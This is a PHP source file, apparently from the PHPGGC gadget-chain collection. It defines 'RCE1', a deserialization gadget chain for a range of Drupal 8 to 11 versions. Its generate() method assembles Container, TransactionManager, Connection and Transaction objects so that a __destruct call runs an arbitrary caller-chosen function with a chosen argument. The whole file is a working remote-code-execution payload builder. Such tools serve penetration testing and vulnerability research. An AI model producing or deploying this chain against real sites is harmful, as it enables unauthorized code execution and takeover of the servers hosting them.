<?php

namespace GadgetChain\Drupal;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '>= 8.0.0 < 10.4.9 || >= 10.5.0 < 10.5.6 || >= 11.0.0 < 11.1.9 || >= 11.2.0 < 11.2.8';
    public static $vector = '__destruct';
    public static $author = 'anzuukino aka Yuu';
    public static $information = 
    'It uses a __destruct() method to trigger call_user_func(), which eventually leads to a call_user_func_array() call after several intermediate function jumps.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];
        $serviceDefinitions = [
            1 => [
                'factory' => $function,
                'arguments' => [$parameter],
            ],
        ];
        $container = new \Drupal\Component\DependencyInjection\Container($serviceDefinitions);
        $callback = [$container, 'get'];

        $transactionId = 'x';
        $stackItem = new \Drupal\Core\Database\Transaction\StackItem('anzuukino', \Drupal\Core\Database\Transaction\StackItemType::Root);

        $manager = new \Drupal\mysql\Driver\Database\mysql\TransactionManager(
            [$transactionId => $stackItem],
            [$callback],
            \Drupal\Core\Database\Transaction\ClientConnectionTransactionState::Committed,
            $transactionId,
        );

        $connection = new \Drupal\mysql\Driver\Database\mysql\Connection($manager);

        $payload = new \Drupal\Core\Database\Transaction($connection, 'a', $transactionId);
        return $payload;
    }
}